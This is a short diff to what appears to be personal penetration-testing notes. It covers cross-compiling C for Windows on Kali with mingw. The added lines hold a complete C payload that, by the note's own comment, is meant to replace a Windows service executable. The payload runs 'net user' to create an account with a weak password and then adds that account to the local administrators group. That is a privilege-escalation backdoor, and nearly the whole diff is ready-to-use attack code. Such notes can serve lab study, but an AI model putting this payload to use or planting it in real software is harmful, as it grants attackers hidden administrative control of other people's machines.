@@ -1,3 +1,18 @@
 mingw-w64
 # this tool compile C on Kali, as it would on windows.h
 i686-w64-mingw32-gcc code.c -o coded.exe -lws2_32
+
+# Payload to create users, for some reason msfvenom don't work replacing service .exe bin, but this works:
+=================================
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user user2 password123 /add");
+  i = system ("net localgroup administrators user2 /add");
+  
+  return 0;
+}
+=================================
